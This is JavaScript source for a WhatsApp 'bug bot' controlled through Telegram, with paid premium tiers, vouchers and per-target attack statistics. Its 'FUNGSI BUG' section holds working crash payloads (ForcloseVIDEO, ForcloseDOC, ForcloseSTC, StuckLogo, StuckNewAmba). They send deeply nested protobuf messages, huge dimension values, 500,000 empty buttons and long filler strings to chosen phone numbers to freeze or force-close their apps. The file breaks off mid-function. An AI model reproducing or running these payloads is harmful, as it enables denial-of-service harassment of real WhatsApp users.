// =====================================================
//  HEFAISTOS HADES — FULL v2
//  WhatsApp Bug Bot • Telegram Control Panel
//  Dev : @shinracery
// =====================================================

const { Telegraf } = require("telegraf");
const fs = require("fs");
const path = require("path");
const chalk = require("chalk");
const axios = require("axios");
const moment = require("moment-timezone");
const pino = require("pino");
const crypto = require("crypto");
const EventEmitter = require("events");
const { tokenBot, ownerID } = require("./config");

const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  DisconnectReason,
  proto,
  generateWAMessageFromContent,
} = require("@whiskeysockets/baileys");

// ---------- setting dasar ----------
const thumbnailUrl     = "https://k.top4top.io/p_3927brgaj0.png";
const ThumbnailPairing = "https://k.top4top.io/p_3927brgaj0.png";
const usePairingCode   = true;

const bot = new Telegraf(tokenBot);

let sock                = null;
global.sock             = null;
let isWhatsAppConnected = false;
let lastPairingMessage  = null;
let botStartTime        = Date.now();
let maintenanceMode     = false;
let autobackupEnabled   = false;
let autobackupInterval  = null;

// ---------- helper ----------
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const esc = (s = "") => String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");

function formatTarget(n) {
  if (!n) return null;
  n = n.replace(/[^0-9]/g, "");
  if (n.startsWith("0")) n = "62" + n.slice(1);
  return n + "@s.whatsapp.net";
}
function formatRuntime() {
  let s = Math.floor(process.uptime());
  const h = Math.floor(s / 3600); s %= 3600;
  const m = Math.floor(s / 60); s %= 60;
  return `${h}h ${m}m ${s}s`;
}
function formatUptimePretty() {
  let s = Math.floor((Date.now() - botStartTime) / 1000);
  const d = Math.floor(s / 86400); s %= 86400;
  const h = Math.floor(s / 3600); s %= 3600;
  const m = Math.floor(s / 60); s %= 60;
  return `${d}d ${h}h ${m}m ${s}s`;
}
const formatMemory = () => `${(process.memoryUsage().rss / 524 / 524).toFixed(0)} MB`;

// =====================================================
// ============ DATABASE ===============================
// =====================================================
if (!fs.existsSync("./database")) fs.mkdirSync("./database", { recursive: true });

const USERS_FILE      = "./database/users.json";
const BANNED_FILE     = "./database/banned.json";
const LIMIT_FILE      = "./database/limit.json";
const DAILY_FILE      = "./database/daily.json";
const VOUCHER_FILE    = "./database/voucher.json";
const REFERRAL_FILE   = "./database/referral.json";
const WHITELIST_FILE  = "./database/whitelist.json";
const COIN_FILE       = "./database/coin.json";
const LOG_FILE        = "./database/logs.json";
const STATSCMD_FILE   = "./database/statscmd.json";
const SETTINGS_FILE   = "./database/settings.json";

const readJSON = (file, def = {}) => {
  try {
    if (!fs.existsSync(file)) { fs.writeFileSync(file, JSON.stringify(def, null, 2)); return def; }
    return JSON.parse(fs.readFileSync(file, "utf8") || JSON.stringify(def));
  } catch { return def; }
};
const writeJSON = (file, data) => fs.writeFileSync(file, JSON.stringify(data, null, 2));

// ---------- USER DB ----------
function ensureUser(user) {
  const db = readJSON(USERS_FILE, {});
  const id = String(user.id);
  if (!db[id]) {
    db[id] = {
      id,
      name: user.username ? `@${user.username}` : user.first_name || "User",
      first_seen: moment().tz("Asia/Jakarta").format("DD-MM-YYYY HH:mm"),
      total_uses: 0, premium: false, premium_until: null,
      banned: false, limit_override: null, referred_by: null,
      ref_code: `REF${crypto.randomBytes(4).toString("hex").toUpperCase()}`,
    };
    writeJSON(USERS_FILE, db);
  } else {
    db[id].name = user.username ? `@${user.username}` : user.first_name || "User";
    writeJSON(USERS_FILE, db);
  }
  return db[id];
}
function getUser(id) { return readJSON(USERS_FILE, {})[String(id)] || null; }
function saveUser(id, data) {
  const db = readJSON(USERS_FILE, {});
  db[String(id)] = { ...(db[String(id)] || {}), ...data };
  writeJSON(USERS_FILE, db);
}
function getAllUsers() { return readJSON(USERS_FILE, {}); }

function isBanned(id) { return !!readJSON(BANNED_FILE, {})[String(id)]; }
function banUser(id, reason = "-") {
  const b = readJSON(BANNED_FILE, {});
  b[String(id)] = { reason, at: moment().tz("Asia/Jakarta").format("DD-MM-YYYY HH:mm") };
  writeJSON(BANNED_FILE, b);
}
function unbanUser(id) { const b = readJSON(BANNED_FILE, {}); delete b[String(id)]; writeJSON(BANNED_FILE, b); }
function getAllBanned() { return readJSON(BANNED_FILE, {}); }

// ---------- LIMIT ----------
const DEFAULT_LIMIT_FREE = 3;
function getLimitDB() { return readJSON(LIMIT_FILE, {}); }
function getTodayKey() { return moment().tz("Asia/Jakarta").format("YYYY-MM-DD"); }
function getUserLimit(userId) {
  const db = getLimitDB();
  const today = getTodayKey();
  const u = db[String(userId)];
  if (!u || u.date !== today) return { used: 0, max: DEFAULT_LIMIT_FREE, date: today };
  return u;
}
function addUse(userId) {
  const db = getLimitDB();
  const today = getTodayKey();
  const u = db[String(userId)];
  if (!u || u.date !== today) db[String(userId)] = { used: 1, max: DEFAULT_LIMIT_FREE, date: today };
  else db[String(userId)].used += 1;
  writeJSON(LIMIT_FILE, db);
}
function setUserLimit(userId, max) {
  const db = getLimitDB();
  db[String(userId)] = { used: (db[String(userId)]?.used || 0), max, date: getTodayKey() };
  writeJSON(LIMIT_FILE, db);
}
function resetAllLimit() { writeJSON(LIMIT_FILE, {}); }
function canUse(userId) {
  if (isPremiumUser(userId)) return true;
  const u = getUserLimit(userId);
  return u.used < u.max;
}

// ---------- PREMIUM ----------
const premiumFile = "./database/premium.json";
const loadPremUsers = () => { try { return JSON.parse(fs.readFileSync(premiumFile)); } catch { return {}; } };
const savePremUsers = (u) => fs.writeFileSync(premiumFile, JSON.stringify(u, null, 2));
function addPremUser(userId, duration) {
  const u = loadPremUsers();
  const exp = moment().add(duration, "days").tz("Asia/Jakarta").format("DD-MM-YYYY");
  u[userId] = exp; savePremUsers(u);
  saveUser(userId, { premium: true, premium_until: exp });
  return exp;
}
function removePremUser(userId) {
  const u = loadPremUsers(); delete u[userId]; savePremUsers(u);
  saveUser(userId, { premium: false, premium_until: null });
}
function isPremiumUser(userId) {
  const u = loadPremUsers();
  if (!u[userId]) return false;
  if (moment().isBefore(moment(u[userId], "DD-MM-YYYY"))) return true;
  removePremUser(userId); return false;
}
function sisaHariPremium(userId) {
  const u = loadPremUsers();
  if (!u[userId]) return 0;
  const diff = moment(u[userId], "DD-MM-YYYY").diff(moment(), "days");
  return diff >= 0 ? diff : 0;
}
function getPremExpired(userId) { return loadPremUsers()[userId] || "-"; }

// ---------- VOUCHER ----------
function createVoucher(days, count) {
  const db = readJSON(VOUCHER_FILE, {});
  const codes = [];
  for (let i = 0; i < count; i++) {
    const code = `HADES-${crypto.randomBytes(3).toString("hex").toUpperCase()}`;
    db[code] = { days, used: false, created_at: moment().tz("Asia/Jakarta").format("DD-MM-YYYY HH:mm") };
    codes.push(code);
  }
  writeJSON(VOUCHER_FILE, db);
  return codes;
}
function redeemVoucher(code, userId) {
  const db = readJSON(VOUCHER_FILE, {});
  const c = db[code];
  if (!c) return { ok: false, msg: "Kode gak ditemukan." };
  if (c.used) return { ok: false, msg: "Kode udah dipakai." };
  db[code].used = true;
  db[code].used_by = String(userId);
  db[code].used_at = moment().tz("Asia/Jakarta").format("DD-MM-YYYY HH:mm");
  writeJSON(VOUCHER_FILE, db);
  const exp = addPremUser(userId, c.days);
  return { ok: true, days: c.days, exp };
}
function listVoucher() {
  const db = readJSON(VOUCHER_FILE, {});
  return Object.entries(db).map(([code, v]) => ({ code, ...v }));
}

// ---------- REFERRAL ----------
function setReferral(newUserId, code) {
  const users = readJSON(USERS_FILE, {});
  const referrer = Object.values(users).find((u) => u.ref_code === code);
  if (!referrer) return false;
  if (referrer.id === String(newUserId)) return false;
  users[String(newUserId)] = { ...(users[String(newUserId)] || {}), referred_by: referrer.id };
  writeJSON(USERS_FILE, users);
  const refDB = readJSON(REFERRAL_FILE, {});
  refDB[referrer.id] = refDB[referrer.id] || [];
  refDB[referrer.id].push({ id: String(newUserId), at: moment().tz("Asia/Jakarta").format("DD-MM-YYYY HH:mm") });
  writeJSON(REFERRAL_FILE, refDB);
  return true;
}
function getReferral(userId) { return readJSON(REFERRAL_FILE, {})[String(userId)] || []; }
function getMyRefCode(userId) { return readJSON(USERS_FILE, {})[String(userId)]?.ref_code || "-"; }

// ---------- DAILY ----------
function checkDaily(userId) {
  const db = readJSON(DAILY_FILE, {});
  const today = getTodayKey();
  if (db[String(userId)] === today) return false;
  db[String(userId)] = today;
  writeJSON(DAILY_FILE, db);
  return true;
}

// ---------- WHITELIST ----------
function loadWhitelist() { return readJSON(WHITELIST_FILE, { list: [] }); }
function addWhitelist(nomor) {
  const w = loadWhitelist();
  nomor = nomor.replace(/[^0-9]/g, "");
  if (!w.list.includes(nomor)) w.list.push(nomor);
  writeJSON(WHITELIST_FILE, w);
}
function delWhitelist(nomor) {
  const w = loadWhitelist();
  nomor = nomor.replace(/[^0-9]/g, "");
  w.list = w.list.filter((n) => n !== nomor);
  writeJSON(WHITELIST_FILE, w);
}
function isWhitelisted(nomor) {
  const w = loadWhitelist();
  return w.list.includes(nomor.replace(/[^0-9]/g, ""));
}

// ---------- COIN ----------
function addCoin(userId, amount) {
  const db = readJSON(COIN_FILE, {});
  db[String(userId)] = (db[String(userId)] || 0) + amount;
  writeJSON(COIN_FILE, db);
}
function getCoin(userId) { return readJSON(COIN_FILE, {})[String(userId)] || 0; }
function useCoin(userId, amount) {
  const db = readJSON(COIN_FILE, {});
  const cur = db[String(userId)] || 0;
  if (cur < amount) return false;
  db[String(userId)] = cur - amount;
  writeJSON(COIN_FILE, db);
  return true;
}

// ---------- LOG ----------
function addLog(type, msg, userId = null) {
  const db = readJSON(LOG_FILE, { logs: [] });
  db.logs.unshift({ type, msg, userId, at: moment().tz("Asia/Jakarta").format("DD-MM-YYYY HH:mm:ss") });
  if (db.logs.length > 500) db.logs = db.logs.slice(0, 500);
  writeJSON(LOG_FILE, db);
}
function getLogs(n = 20) { return readJSON(LOG_FILE, { logs: [] }).logs.slice(0, n); }

// ---------- STATSCMD ----------
function logCmd(cmd) {
  const db = readJSON(STATSCMD_FILE, {});
  db[cmd] = (db[cmd] || 0) + 1;
  writeJSON(STATSCMD_FILE, db);
}
function getStatCmd() {
  return Object.entries(readJSON(STATSCMD_FILE, {})).map(([c, n]) => ({ c, n })).sort((a, b) => b.n - a.n);
}

// ---------- SETTINGS ----------
function getSettings() { return readJSON(SETTINGS_FILE, { maintenance: false, autobackup: false }); }
function saveSettings(d) { writeJSON(SETTINGS_FILE, d); }
maintenanceMode = getSettings().maintenance || false;
autobackupEnabled = getSettings().autobackup || false;

// ---------- GROUP DB ----------
const PREM_DB = path.join(__dirname, "premgb.json");
function loadPrem() {
  try {
    if (!fs.existsSync(PREM_DB)) fs.writeFileSync(PREM_DB, JSON.stringify({ groups: [] }, null, 2));
    const d = JSON.parse(fs.readFileSync(PREM_DB, "utf8"));
    return d?.groups && Array.isArray(d.groups) ? d : { groups: [] };
  } catch { return { groups: [] }; }
}
const savePrem = (d) => fs.writeFileSync(PREM_DB, JSON.stringify(d, null, 2));
const isPremGroup = (id) => loadPrem().groups.includes(Number(id));
const addPremGroup = (id) => { const d = loadPrem(); id = Number(id); if (!d.groups.includes(id)) d.groups.push(id); savePrem(d); };
const delPremGroup = (id) => { const d = loadPrem(); d.groups = d.groups.filter((x) => x !== Number(id)); savePrem(d); };

const APPROVED_FILE = path.join(__dirname, "approved_groups.json");
let approvedGroups = [];
let pendingGroups = new Map();
try {
  if (fs.existsSync(APPROVED_FILE)) {
    const d = JSON.parse(fs.readFileSync(APPROVED_FILE, "utf8"));
    approvedGroups = Array.isArray(d) ? d : [];
  }
} catch {}
const saveApproved = () => fs.writeFileSync(APPROVED_FILE, JSON.stringify(approvedGroups, null, 2));
const isGroupApproved = (id) => approvedGroups.includes(String(id));
const isOwner = (id) => String(id) === String(ownerID);

// ---------- BLOCKED CMD ----------
const BLOCKED_FILE = path.join(__dirname, "blocked_commands.json");
let blockedCommands = [];
try {
  if (fs.existsSync(BLOCKED_FILE)) {
    const d = JSON.parse(fs.readFileSync(BLOCKED_FILE, "utf8"));
    blockedCommands = Array.isArray(d) ? d.map((x) => String(x).toLowerCase().trim()) : [];
  }
} catch {}
const saveBlocked = () => fs.writeFileSync(BLOCKED_FILE, JSON.stringify(blockedCommands, null, 2));
const normCmd = (s) => String(s || "").trim().toLowerCase().replace(/^\//, "");
const isBlocked = (c) => blockedCommands.includes(normCmd(c));

// ---------- POINT ----------
const POINTS_FILE = path.join(__dirname, "points.json");
function loadPoints() {
  try {
    if (!fs.existsSync(POINTS_FILE)) fs.writeFileSync(POINTS_FILE, JSON.stringify({}, null, 2));
    return JSON.parse(fs.readFileSync(POINTS_FILE, "utf8") || "{}");
  } catch { return {}; }
}
const savePoints = (d) => fs.writeFileSync(POINTS_FILE, JSON.stringify(d, null, 2));
function ensurePoint(user) {
  const db = loadPoints();
  const id = String(user.id);
  db[id] = db[id] || { id, name: user.username ? `@${user.username}` : user.first_name || "User", points: 0, win: 0, lose: 0, draw: 0 };
  db[id].name = user.username ? `@${user.username}` : user.first_name || "User";
  savePoints(db);
  return db;
}
const addWin  = (u) => { const d = ensurePoint(u); d[String(u.id)].points += 3; d[String(u.id)].win += 1; savePoints(d); };
const addLose = (u) => { const d = ensurePoint(u); d[String(u.id)].lose += 1; savePoints(d); };
const addDraw = (u) => { const d = ensurePoint(u); d[String(u.id)].points += 1; d[String(u.id)].draw += 1; savePoints(d); };
const getPoint = (id) => loadPoints()[String(id)] || null;
const getTop = (n = 10) => Object.values(loadPoints()).sort((a, b) => b.points - a.points).slice(0, n);
const addSuitWin  = (u) => { const d = ensurePoint(u); d[String(u.id)].points += 2; d[String(u.id)].win += 1; savePoints(d); };
const addSuitLose = (u) => { const d = ensurePoint(u); d[String(u.id)].lose += 1; savePoints(d); };
const addSuitDraw = (u) => { const d = ensurePoint(u); d[String(u.id)].draw += 1; savePoints(d); };
function givePointDaily(user) {
  const d = ensurePoint(user);
  d[String(user.id)].points += 5;
  savePoints(d);
}

// =====================================================
// ============ STATS STORAGE ==========================
// =====================================================
const STATS_FILE = path.join(__dirname, "database", "stats.json");
function loadStats() {
  try {
    if (!fs.existsSync(STATS_FILE)) fs.writeFileSync(STATS_FILE, JSON.stringify({
      total_jobs: 0, total_iterasi_ok: 0, total_iterasi_fail: 0,
      per_user: {}, per_target: {}, per_label: {}, per_day: {}, per_group: {}, last_job: null,
    }, null, 2));
    return JSON.parse(fs.readFileSync(STATS_FILE, "utf8"));
  } catch {
    return { total_jobs: 0, total_iterasi_ok: 0, total_iterasi_fail: 0, per_user: {}, per_target: {}, per_label: {}, per_day: {}, per_group: {}, last_job: null };
  }
}
const saveStats = (d) => fs.writeFileSync(STATS_FILE, JSON.stringify(d, null, 2));
function todayWIB() { return moment().tz("Asia/Jakarta").format("YYYY-MM-DD"); }
function logStatsStart(userId, userName, label, target, groupId = null) {
  const s = loadStats();
  const uid = String(userId);
  const rawTarget = String(target).split("@")[0];
  s.total_jobs = (s.total_jobs || 0) + 1;
  s.per_user[uid] = s.per_user[uid] || { name: userName, bug_count: 0, ban_count: 0, iter_ok: 0, iter_fail: 0 };
  s.per_user[uid].name = userName;
  s.per_user[uid].bug_count += 1;
  s.per_target[rawTarget] = (s.per_target[rawTarget] || 0) + 1;
  s.per_label[label] = (s.per_label[label] || 0) + 1;
  if (groupId) {
    s.per_group = s.per_group || {};
    s.per_group[String(groupId)] = (s.per_group[String(groupId)] || 0) + 1;
  }
  const day = todayWIB();
  s.per_day[day] = s.per_day[day] || { bug: 0, ban: 0 };
  s.per_day[day].bug += 1;
  s.last_job = { user: userName, label, target: rawTarget, at: moment().tz("Asia/Jakarta").format("DD-MM-YYYY HH:mm") };
  saveStats(s);
}
function logStatsFinish(userId, iterOk, iterFail) {
  const s = loadStats();
  const uid = String(userId);
  s.total_iterasi_ok = (s.total_iterasi_ok || 0) + iterOk;
  s.total_iterasi_fail = (s.total_iterasi_fail || 0) + iterFail;
  if (s.per_user[uid]) { s.per_user[uid].iter_ok += iterOk; s.per_user[uid].iter_fail += iterFail; }
  saveStats(s);
}
function logStatsBan(userId, userName) {
  const s = loadStats();
  const uid = String(userId);
  s.per_user[uid] = s.per_user[uid] || { name: userName, bug_count: 0, ban_count: 0, iter_ok: 0, iter_fail: 0 };
  s.per_user[uid].name = userName;
  s.per_user[uid].ban_count += 1;
  const day = todayWIB();
  s.per_day[day] = s.per_day[day] || { bug: 0, ban: 0 };
  s.per_day[day].ban += 1;
  saveStats(s);
}

// =====================================================
// ================ FUNGSI BUG =========================
// =====================================================
async function ForcloseVIDEO(sock, target) {
  const video = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0&mms3=true",
    mimetype: "video/mp4", fileSha256: "sHsVF8wMbs/aI6GB8xhiZF1NiKQOgB2GaM5O0/NuAII=",
    fileLength: 999999999, seconds: 999999999,
    mediaKey: "EneIl9K1B0/ym3eD0pbqriq+8K7dHMU9kkonkKgPs/8=",
    caption: "NandoX", height: 9999, width: 9999,
    fileEncSha256: "KcHu146RNJ6FP2KHnZ5iI1UOLhew1XC5KEjMKDeZr8I=",
    directPath: "/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1751081957", jpegThumbnail: null, streamingSidecar: null,
  };
  const tol = [[0xBA, 0x03], [0xD2, 0x04], [0xAA, 0x02]];
  const encodeVarint = function (rb) { var buf = []; while (rb >= 0x80) { buf.push((rb & 0x7f) | 0x80); rb >>>= 7; } buf.push(rb); return Buffer.from(buf); };
  const wrapLd = function (tag, data) { return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]); };
  const MakLo = proto.Message.encode(proto.Message.fromObject({ videoMessage: video })).finish();
  const inflate = function (tag, rayap) { var buf = MakLo; for (var i = 0; i < rayap; i++) buf = wrapLd(tag, wrapLd([0x0A], buf)); return buf; };
  const resolveJid = function (raw) { var s = String(raw || "").trim(); if (s.includes("@")) return s; return s.replace(/\D/g, "") + "@s.whatsapp.net"; };
  const jids = (Array.isArray(target) ? target : [target]).map(resolveJid).filter(function (j) { return j.length > 15; });
  var MAX_BATCH = 100, DELAY_MS = 2000;
  for (var offset = 0; offset < jids.length; offset += MAX_BATCH) {
    var crb = jids.slice(offset, offset + MAX_BATCH);
    if (offset !== 0) await new Promise(function (r) { setTimeout(r, DELAY_MS); });
    var idx = Math.floor(offset / MAX_BATCH) + 1;
    var suffix = idx > 1 ? "n" + idx : "n";
    var CrBMsG = "crb" + Date.now().toString(36).toUpperCase() + suffix;
    for (var ti = 0; ti < tol.length; ti++) {
      var tag = tol[ti]; var bokep = null;
      for (var rayap = 5000; rayap >= 2000 && !bokep; rayap -= 400) {
        try { var decoded = proto.Message.decode(inflate(tag, rayap)); proto.Message.encode(decoded).finish(); bokep = decoded; } catch (_) {}
      }
      if (!bokep) continue;
      await sock.relayMessage("status@broadcast", bokep, {
        messageId: CrBMsG, statusJidList: crb,
        additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: crb.map(function (jid) { return { tag: "to", attrs: { jid: jid }, content: [] }; }) }] }],
      });
    }
  }
}

async function ForcloseDOC(sock, target) {
  const document = {
    url: "https://mmg.whatsapp.net/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0&mms3=true",
    mimetype: "application/pdf", fileSha256: "7rOXceVPuGvMTfHN7VXURYOQV2ZmzxQ4xZ6cLM2JNPA=",
    fileLength: 999999999, pageCount: 1000,
    mediaKey: "oohdpzQ3uCjBvJWx+2VmRj4bWsCiTvrpUftezu27bs4=", fileName: "nando.pdf",
    fileEncSha256: "IT6Goux9voqfI50TST8rtFY9iVmxZenRz55JXZpAR2g=",
    directPath: "/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1779839963",
    thumbnailDirectPath: "/v/t62.36145-24/705860036_1320514133375133_5228808273876536402_n.enc?ccb=11-4&oh=01_Q5Aa4gFkVLVWUFlX-Jk7uj1PdsnY5lmVp4lWmmQYdHkPsFhTUQ&oe=6A3DAF40&_nc_sid=5e03e0",
    thumbnailSha256: "xK2z7ScS2wSQDxLVfdZ5e1BpIe+GsTv8KaVGAfufqjY=",
    thumbnailEncSha256: "2N98oiJb8xii+D/KYAuHRq7Mg/8OIHFXNZQ5py4g9fM=",
    jpegThumbnail: null, contextInfo: {}, thumbnailHeight: 999, thumbnailWidth: 999,
  };
  const tol = [[0xBA, 0x03], [0xD2, 0x04], [0xAA, 0x02]];
  const encodeVarint = function (rb) { var buf = []; while (rb >= 0x80) { buf.push((rb & 0x7f) | 0x80); rb >>>= 7; } buf.push(rb); return Buffer.from(buf); };
  const wrapLd = function (tag, data) { return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]); };
  const MakLo = proto.Message.encode(proto.Message.fromObject({ documentMessage: document })).finish();
  const inflate = function (tag, rayap) { var buf = MakLo; for (var i = 0; i < rayap; i++) buf = wrapLd(tag, wrapLd([0x0A], buf)); return buf; };
  const resolveJid = function (raw) { var s = String(raw || "").trim(); if (s.includes("@")) return s; return s.replace(/\D/g, "") + "@s.whatsapp.net"; };
  const jids = (Array.isArray(target) ? target : [target]).map(resolveJid).filter(function (j) { return j.length > 15; });
  var MAX_BATCH = 100, DELAY_MS = 2000;
  for (var offset = 0; offset < jids.length; offset += MAX_BATCH) {
    var crb = jids.slice(offset, offset + MAX_BATCH);
    if (offset !== 0) await new Promise(function (r) { setTimeout(r, DELAY_MS); });
    var idx = Math.floor(offset / MAX_BATCH) + 1;
    var suffix = idx > 1 ? "n" + idx : "n";
    var CrBMsG = "crb" + Date.now().toString(36).toUpperCase() + suffix;
    for (var ti = 0; ti < tol.length; ti++) {
      var tag = tol[ti]; var bokep = null;
      for (var rayap = 5000; rayap >= 2000 && !bokep; rayap -= 400) {
        try { var decoded = proto.Message.decode(inflate(tag, rayap)); proto.Message.encode(decoded).finish(); bokep = decoded; } catch (_) {}
      }
      if (!bokep) continue;
      await sock.relayMessage("status@broadcast", bokep, {
        messageId: CrBMsG, statusJidList: crb,
        additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: crb.map(function (jid) { return { tag: "to", attrs: { jid: jid }, content: [] }; }) }] }],
      });
    }
  }
}

async function ForcloseSTC(sock, target) {
  const sticker = {
    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
    fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
    fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
    mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
    mimetype: "image/webp",
    directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
    fileLength: "10610", mediaKeyTimestamp: "1775044724", stickerSentTs: "1775044724091",
  };
  const tol = [[0xBA, 0x03], [0xD2, 0x04], [0xAA, 0x02]];
  const encodeVarint = function (rb) { var buf = []; while (rb >= 0x80) { buf.push((rb & 0x7f) | 0x80); rb >>>= 7; } buf.push(rb); return Buffer.from(buf); };
  const wrapLd = function (tag, data) { return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]); };
  const MakLo = proto.Message.encode(proto.Message.fromObject({ stickerMessage: sticker })).finish();
  const inflate = function (tag, rayap) { var buf = MakLo; for (var i = 0; i < rayap; i++) buf = wrapLd(tag, wrapLd([0x0A], buf)); return buf; };
  const resolveJid = function (raw) { var s = String(raw || "").trim(); if (s.includes("@")) return s; return s.replace(/\D/g, "") + "@s.whatsapp.net"; };
  const jids = (Array.isArray(target) ? target : [target]).map(resolveJid).filter(function (j) { return j.length > 15; });
  var MAX_BATCH = 100, DELAY_MS = 2000;
  for (var offset = 0; offset < jids.length; offset += MAX_BATCH) {
    var crb = jids.slice(offset, offset + MAX_BATCH);
    if (offset !== 0) await new Promise(function (r) { setTimeout(r, DELAY_MS); });
    var idx = Math.floor(offset / MAX_BATCH) + 1;
    var suffix = idx > 1 ? "n" + idx : "n";
    var CrBMsG = "crb" + Date.now().toString(36).toUpperCase() + suffix;
    for (var ti = 0; ti < tol.length; ti++) {
      var tag = tol[ti]; var bokep = null;
      for (var rayap = 5000; rayap >= 2000 && !bokep; rayap -= 400) {
        try { var decoded = proto.Message.decode(inflate(tag, rayap)); proto.Message.encode(decoded).finish(); bokep = decoded; } catch (_) {}
      }
      if (!bokep) continue;
      await sock.relayMessage("status@broadcast", bokep, {
        messageId: CrBMsG, statusJidList: crb,
        additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: crb.map(function (jid) { return { tag: "to", attrs: { jid: jid }, content: [] }; }) }] }],
      });
    }
  }
}

async function StuckLogo(sock, target) {
  await sock.relayMessage(target, {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0&mms3=true",
      fileSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
      fileEncSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
      mediaKey: "YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXphYmNkZWY=",
      mimetype: "image/webp", height: 4294967295, width: 4294967295,
      directPath: "/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1",
      fileLength: 9007199254740991, mediaKeyTimestamp: 9007199254740991,
      firstFrameLength: 4294967295,
      firstFrameSidecar: "YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXphYmNkZWY=",
      isAnimated: true, pngThumbnail: "YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXphYmNkZWY=",
      contextInfo: { mentionedJid: [target], quotedMessage: { contactMessage: { displayName: " ", vcard: "\u0000".repeat(45000) } } },
      stickerSentTs: 9007199254740991, isAvatar: true, isAiSticker: true, isLottie: true,
      accessibilityLabel: "ꦾ".repeat(30000)
    }
  }, { participant: target });

  await sock.relayMessage(target, {
    groupStatusMessageV2: { message: { interactiveMessage: {
      body: { text: "Vixzz Ganteng Bangettt" },
      nativeFlowMessage: { buttons: Array.from({ length: 500000 }, () => ({})) },
      contextInfo: { quotedMessage: { contactMessage: { displayName: " ", vcard: "" } } }
    } } }
  }, { participant: target });

  await sock.relayMessage(target, {
    groupStatusMessageV2: { message: { interactiveResponseMessage: {
      body: { text: "AmbaJahat", format: "DEFAULT" },
      nativeFlowResponseMessage: { name: "galaxy_message", paramsJson: "\u2062".repeat(30000), version: 3 },
      contextInfo: { quotedMessage: { contactMessage: { displayName: " ", vcard: "" } } }
    } } }
  }, { participant: target });
}

async function StuckNewAmba(sock, target) {
  await sock.relayMessage(target, {
    groupStatusMessageV2: { message: { interactiveMessage: {
      body: { text: "AmbaJahat || @vixzzoficialNe" },
      nativeFlowMessage: { buttons: Array.from({ length: 500000 }, () => ({})) },
      contextInfo: { mentionedJid: [target], quotedMessage: { imageMessage: {
        url: "https://mmg.whatsapp.net/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1",
        mimetype: "image/jpeg", fileSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
        fileLength: 9007199254740991, height: 4294967295, width: 4294967295,
        mediaKey: crypto.randomBytes(32).toString("base64"),
        fileEncSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
        directPath: "/m1/v/t24/00002299291718920200291920729100",
